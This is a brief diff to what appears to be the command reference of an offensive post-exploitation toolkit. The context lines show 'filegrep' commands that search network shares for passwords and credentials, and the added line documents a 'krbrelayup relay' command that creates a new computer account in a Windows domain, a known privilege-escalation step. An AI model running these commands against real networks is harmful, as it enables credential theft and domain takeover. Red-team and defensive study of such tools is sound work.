@@ -271,6 +271,7 @@ filegrep <path> <file mask> <regex> <recurse>
 filegrep \\server\\share *.* credential: true
 filegrep \\server\\share *.* "(password|pass|cred|credential)\\s*(=|:|>)" true
 syscallsextractor
+krbrelayup relay -d <domain_name> -c -cn <new_computer_name> -cp <new_computer_passwd>
 
 * Process Dumping:
 ===================
